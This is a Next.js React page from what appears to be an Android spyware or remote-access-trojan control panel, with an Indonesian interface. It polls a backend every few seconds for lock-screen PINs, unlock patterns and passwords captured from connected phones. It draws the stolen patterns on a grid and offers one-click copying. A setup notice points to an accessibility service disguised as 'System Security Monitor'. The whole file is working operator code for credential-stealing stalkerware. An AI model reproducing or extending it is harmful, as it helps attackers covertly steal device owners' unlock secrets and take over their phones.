'use client'

import { useState, useEffect, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import {
  ShieldAlert, RefreshCw, Trash2, Copy, Check,
  Hash, Grid3x3, Type, HelpCircle, Signal,
} from 'lucide-react'

interface DeviceItem {
  deviceId: string
  deviceName: string
  connected: boolean
}

interface PinCapture {
  id: number
  lockType: string
  value: string
  capturedAt: string
}

const TYPE_CONFIG: Record<string, {
  label: string
  textColor: string
  bgColor: string
  borderColor: string
  icon: React.ReactNode
}> = {
  pin:      {
    label: 'PIN',
    textColor: 'text-yellow-400',
    bgColor: 'bg-yellow-400/10',
    borderColor: 'border-yellow-400/30',
    icon: <Hash size={12} />,
  },
  pattern:  {
    label: 'Pola',
    textColor: 'text-purple-400',
    bgColor: 'bg-purple-400/10',
    borderColor: 'border-purple-400/30',
    icon: <Grid3x3 size={12} />,
  },
  password: {
    label: 'Sandi',
    textColor: 'text-android-blue',
    bgColor: 'bg-android-blue/10',
    borderColor: 'border-android-blue/30',
    icon: <Type size={12} />,
  },
  unknown:  {
    label: 'Lainnya',
    textColor: 'text-android-muted',
    bgColor: 'bg-android-muted/10',
    borderColor: 'border-android-border',
    icon: <HelpCircle size={12} />,
  },
}

function PatternDots({ value }: { value: string }) {
  const nodes = value.split(/[,\s-]+/).map(Number).filter(n => !isNaN(n) && n >= 1 && n <= 9)
  if (nodes.length === 0) return <span className="font-mono text-android-text text-sm">{value}</span>

  const positions: Record<number, [number, number]> = {
    1: [0, 0], 2: [1, 0], 3: [2, 0],
    4: [0, 1], 5: [1, 1], 6: [2, 1],
    7: [0, 2], 8: [1, 2], 9: [2, 2],
  }
  const size = 54

  return (
    <svg width={size} height={size} viewBox="0 0 54 54" className="shrink-0">
      {[1,2,3,4,5,6,7,8,9].map(n => {
        const [cx, cy] = positions[n].map(v => 9 + v * 18)
        const isUsed = nodes.includes(n)
        return (
          <circle key={n} cx={cx} cy={cy} r={isUsed ? 4 : 3}
            fill={isUsed ? '#c084fc' : '#334155'}
            opacity={isUsed ? 1 : 0.5}
          />
        )
      })}
      {nodes.slice(1).map((n, i) => {
        const [x1, y1] = positions[nodes[i]].map(v => 9 + v * 18)
        const [x2, y2] = positions[n].map(v => 9 + v * 18)
        return (
          <line key={i} x1={x1} y1={y1} x2={x2} y2={y2}
            stroke="#c084fc" strokeWidth="1.5" strokeOpacity="0.6" />
        )
      })}
    </svg>
  )
}

export default function PinLogPage() {
  const [deviceId,    setDeviceId]    = useState<string | null>(null)
  const [devices,     setDevices]     = useState<DeviceItem[]>([])
  const [captures,    setCaptures]    = useState<PinCapture[]>([])
  const [loading,     setLoading]     = useState(false)
  const [copied,      setCopied]      = useState<number | null>(null)
  const [filter,      setFilter]      = useState<string>('all')

  const fetchDevices = useCallback(async () => {
    try {
      const res  = await fetch('/api/devices')
      const data = await res.json()
      const list: DeviceItem[] = data.devices ?? []
      setDevices(list)
      if (!deviceId && list.length > 0) {
        const online = list.find(d => d.connected) ?? list[0]
        setDeviceId(online.deviceId)
      }
    } catch {}
  }, [deviceId])

  const fetchCaptures = useCallback(async () => {
    if (!deviceId) return
    setLoading(true)
    try {
      const res  = await fetch(`/api/device/pinlog?deviceId=${deviceId}&limit=200`)
      const data = await res.json()
      if (data.captures) setCaptures(data.captures)
    } finally {
      setLoading(false)
    }
  }, [deviceId])

  useEffect(() => {
    fetchDevices()
    const t = setInterval(fetchDevices, 5000)
    return () => clearInterval(t)
  }, [fetchDevices])

  useEffect(() => {
    if (!deviceId) return
    fetchCaptures()
    const t = setInterval(fetchCaptures, 3000)
    return () => clearInterval(t)
  }, [deviceId, fetchCaptures])

  const handleClear = async () => {
    if (!deviceId || !confirm('Hapus semua data PIN/Pola/Sandi?')) return
    await fetch(`/api/device/pinlog?deviceId=${deviceId}`, { method: 'DELETE' })
    setCaptures([])
  }

  const copyValue = (id: number, value: string) => {
    navigator.clipboard.writeText(value)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  const filtered  = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
  const connected = devices.find(d => d.deviceId === deviceId)?.connected ?? false

  const fmt = (iso: string) =>
    new Date(iso).toLocaleString('id-ID', {
      day: '2-digit', month: 'short',
      hour: '2-digit', minute: '2-digit', second: '2-digit',
    })

  const filterTabs = ['all', 'pin', 'pattern', 'password'] as const
  const tabConfig = {
    all:      { label: 'Semua',   icon: <ShieldAlert size={12} /> },
    pin:      { label: 'PIN',     icon: <Hash size={12} /> },
    pattern:  { label: 'Pola',    icon: <Grid3x3 size={12} /> },
    password: { label: 'Sandi',   icon: <Type size={12} /> },
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={deviceId} onSelect={setDeviceId} />

      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-2xl mx-auto px-4 py-4 md:py-6">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2.5">
              <div className="p-2 rounded-xl bg-android-red/10">
                <ShieldAlert size={18} className="text-android-red" />
              </div>
              <div>
                <h2 className="text-base md:text-lg font-bold text-white leading-tight">PIN / Pola / Sandi</h2>
                <p className="text-[11px] text-android-muted">
                  {captures.length} entri · auto-refresh 3s
                </p>
              </div>
            </div>
            <div className="flex gap-1.5">
              <button
                onClick={fetchCaptures}
                disabled={loading}
                className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors disabled:opacity-50"
              >
                <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
              </button>
              <button
                onClick={handleClear}
                className="p-2 bg-android-surface border border-android-red/30 rounded-lg text-android-red hover:bg-android-red/10 transition-colors"
              >
                <Trash2 size={14} />
              </button>
            </div>
          </div>

          {/* Filter tabs */}
          <div className="flex gap-1.5 mb-4 overflow-x-auto pb-1">
            {filterTabs.map(t => {
              const count = t === 'all' ? captures.length : captures.filter(c => c.lockType === t).length
              const cfg   = tabConfig[t]
              return (
                <button
                  key={t}
                  onClick={() => setFilter(t)}
                  className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
                    filter === t
                      ? 'bg-android-red/10 border-android-red/40 text-android-red'
                      : 'bg-android-surface border-android-border text-android-muted hover:text-white'
                  }`}
                >
                  {cfg.icon}
                  {cfg.label}
                  <span className={`text-[10px] px-1 rounded-full ${filter === t ? 'bg-android-red/20 text-android-red' : 'bg-android-border text-android-muted'}`}>
                    {count}
                  </span>
                </button>
              )
            })}
          </div>

          {/* Setup notice */}
          {connected && captures.length === 0 && !loading && (
            <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-2.5 text-xs text-android-yellow">
              <ShieldAlert size={14} className="shrink-0 mt-0.5" />
              <div>
                <p className="font-semibold">System Security Monitor belum aktif</p>
                <p className="text-android-muted mt-0.5">
                  Settings → Aksesibilitas → Aplikasi yang Diunduh → <strong className="text-android-yellow">System Security Monitor</strong> → ON
                </p>
              </div>
            </div>
          )}

          {!connected && (
            <div className="mb-4 p-3 bg-android-surface border border-android-border rounded-xl flex items-center gap-2 text-xs text-android-muted">
              <Signal size={13} />
              Hubungkan device untuk melihat data PIN/Pola.
            </div>
          )}

          {/* Entry list */}
          {loading && captures.length === 0 ? (
            <div className="text-center py-12 text-android-muted text-sm">Memuat…</div>
          ) : filtered.length === 0 ? (
            <div className="text-center py-12">
              <ShieldAlert size={36} className="mx-auto text-android-muted/30 mb-3" />
              <p className="text-android-muted text-sm">
                {filter === 'all' ? 'Belum ada data tangkapan' : `Belum ada tangkapan tipe "${filter}"`}
              </p>
            </div>
          ) : (
            <div className="space-y-2">
              {filtered.map(c => {
                const info = TYPE_CONFIG[c.lockType] ?? TYPE_CONFIG['unknown']
                const isPattern = c.lockType === 'pattern'
                return (
                  <div
                    key={c.id}
                    className="bg-android-surface border border-android-border rounded-xl p-3.5 flex items-center gap-3 group hover:border-android-muted/50 transition-colors"
                  >
                    {/* Type badge */}
                    <div className={`shrink-0 flex items-center gap-1 px-2 py-1 rounded-lg text-[11px] font-bold border ${info.textColor} ${info.bgColor} ${info.borderColor}`}>
                      {info.icon}
                      {info.label}
                    </div>

                    {/* Value */}
                    <div className="flex-1 min-w-0 flex items-center gap-3">
                      {isPattern
                        ? <PatternDots value={c.value} />
                        : <span className="font-mono text-xl font-bold text-white tracking-widest truncate">{c.value}</span>
                      }
                      <div className="min-w-0">
                        {isPattern && (
                          <p className="font-mono text-xs text-android-muted truncate">{c.value}</p>
                        )}
                        <p className="text-[10px] text-android-muted">{fmt(c.capturedAt)}</p>
                      </div>
                    </div>

                    {/* Copy */}
                    <button
                      onClick={() => copyValue(c.id, c.value)}
                      className="shrink-0 p-1.5 rounded-lg bg-android-bg border border-android-border text-android-muted hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                    >
                      {copied === c.id ? <Check size={13} className="text-android-green" /> : <Copy size={13} />}
                    </button>
                  </div>
                )
              })}
            </div>
          )}

          {/* Footer stats */}
          {filtered.length > 0 && (
            <p className="text-center text-[11px] text-android-muted mt-4">
              {filtered.length} dari {captures.length} entri ditampilkan
            </p>
          )}

        </div>
      </main>
    </div>
  )
}
